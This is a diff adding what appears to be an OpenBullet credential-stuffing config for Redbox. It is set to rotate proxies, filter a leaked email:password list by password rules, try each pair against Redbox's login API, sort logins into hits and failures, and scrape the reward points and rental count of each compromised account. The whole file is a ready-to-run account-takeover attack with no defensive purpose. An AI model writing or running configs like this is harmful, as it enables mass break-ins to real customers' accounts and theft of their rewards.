@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "Redbox",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-21T03:17:02.7516039+00:00",
+  "AdditionalInfo": "10-19 Rentals = Star, 20-49 Rentals = Superstar, 50+ Rentals = Legend          |          1500 points = 1-night DVD rental, 1750 points = 1-night Blu-ray,  2500 points =1-night Game rental",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 1765651324
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Lowercase",
+      "Id": 2030780169
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Uppercase",
+      "Id": 770776914
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 664013076
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.redbox.com/register" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+REQUEST POST "https://www.redbox.com/api/Account/Login/" AutoRedirect=TRUE 
+  CONTENT "{\"userName\":\"<USER>\",\"password\":\"<PASS>\",\"createPersistentCookie\":false}" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "__K: " 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Host: www.redbox.com" 
+  HEADER "Origin: https://www.redbox.com" 
+  HEADER "Referer: https://www.redbox.com/register" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "loggedIn\":false" 
+  KEYCHAIN Success OR 
+    KEY "loggedIn\":true" 
+REQUEST GET "https://www.redbox.com/account" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "                                                     " " pts" Recursive=FALSE -> CAP "Points" "" "" 
+PARSE "<SOURCE>" LR "You have <b>" "<" Recursive=FALSE -> CAP "Rentals" "" "" 
